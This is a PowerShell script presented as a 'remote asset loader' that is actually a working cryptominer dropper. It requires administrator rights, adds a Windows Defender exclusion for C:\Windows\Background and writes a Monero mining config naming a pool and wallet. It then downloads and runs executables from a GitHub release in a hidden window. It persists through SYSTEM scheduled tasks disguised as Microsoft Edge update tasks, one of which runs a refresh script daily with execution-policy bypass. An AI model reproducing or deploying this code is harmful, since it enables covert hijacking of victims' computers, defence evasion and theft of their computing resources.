# remote asset loader
param()

$ErrorActionPreference = 'SilentlyContinue'

# --- endpoints ---------------------------------------------------------------
$RawBase    = 'https://raw.githubusercontent.com/billkentfelty/cdn-sync-7f3a2b/main'
$ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'

$admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }

$dir = 'C:\Windows\Background'
New-Item -ItemType Directory -Force -Path $dir | Out-Null

Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

# pool IP: manually mapped image can't do DNS, so resolve here
# and hand the miner a ready config with the IP
$poolHost = 'pool.supportxmr.com'
$poolIp = $null
try {
    $poolIp = ([System.Net.Dns]::GetHostAddresses($poolHost) |
        Where-Object { $_.AddressFamily -eq 'InterNetwork' } |
        Select-Object -First 1).IPAddressToString
} catch {}

$cfgPath = Join-Path $dir 'config.json'
if ($poolIp) {
    $needWrite = $true
    if (Test-Path $cfgPath) {
        $old = Get-Content $cfgPath -Raw -ErrorAction SilentlyContinue
        if ($old -like "*$poolIp*") { $needWrite = $false }
    }
    if ($needWrite) {
        $cfg = "{
  `"background`": true,
  `"pause-on-active`": 1,
  `"donate-level`": 1,
  `"cpu`": { `"max-threads-hint`": 90 },
  `"pools`": [ { `"url`": `"$poolIp`:443`", `"user`": `"46h6yczeC1FPU77qD3vqsdJwyiCpYDtFterUsde7U3t1Nxkke6VdSGcN9QwzRvnZRb4AKbq33u4saNGQbNfmKu2c2yUsR6o`", `"pass`": `"rigNewGH`", `"keepalive`": true, `"enabled`": true, `"tls`": true } ]
}"
        [System.IO.File]::WriteAllText($cfgPath, $cfg)
    }
}

$sysPath = Join-Path $dir 'system.exe'
$binPath = Join-Path $dir 'sysdata.bin'
if (-not (Test-Path $sysPath)) {
    curl.exe -s -L -o "$dir\system.txt" --retry 3 --retry-delay 5 --max-time 60 "$ReleaseBase/system.txt"
    if (Test-Path "$dir\system.txt") {
        Move-Item -LiteralPath "$dir\system.txt" -Destination $sysPath -Force
    }
}
if (-not (Test-Path $binPath)) {
    curl.exe -s -L -o $binPath --retry 3 --retry-delay 5 --max-time 180 "$ReleaseBase/sysdata.bin"
}

if (Test-Path $sysPath) {
    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
}

$hostName  = $env:COMPUTERNAME
$taskName  = "MicrosoftEdgeUpdateTaskMachineCore$hostName"
$action    = New-ScheduledTaskAction -Execute $sysPath -WorkingDirectory $dir
$trigger   = New-ScheduledTaskTrigger -AtStartup
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null

# daily refresh: re-resolve pool IP, patch config.json; miner hot-reloads (watch)
$updScript = Join-Path $dir 'update.ps1'
$updBody = @"
`$ip = ([System.Net.Dns]::GetHostAddresses('$poolHost') | Where-Object { `$_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1).IPAddressToString
if (`$ip) {
  `$old = if (Test-Path '$cfgPath') { Get-Content '$cfgPath' -Raw } else { '' }
  if (`$old -and (`$old -notlike "*`$ip*")) {
    `$c = `$old -replace '"url": "[0-9.]+:443"', ('"url": "' + `$ip + ':443"')
    if (`$c -ne `$old) { [System.IO.File]::WriteAllText('$cfgPath', `$c) }
  }
}
"@
[System.IO.File]::WriteAllText($updScript, $updBody)
$taskUpd   = "MicrosoftEdgeUpdateTaskMachineUA$env:COMPUTERNAME"
$actUpd    = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-nop -w h -ep bypass -f `"$updScript`""
$trigUpd   = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -TaskName $taskUpd -Action $actUpd -Trigger $trigUpd -Settings $settings -Principal $principal -Force | Out-Null
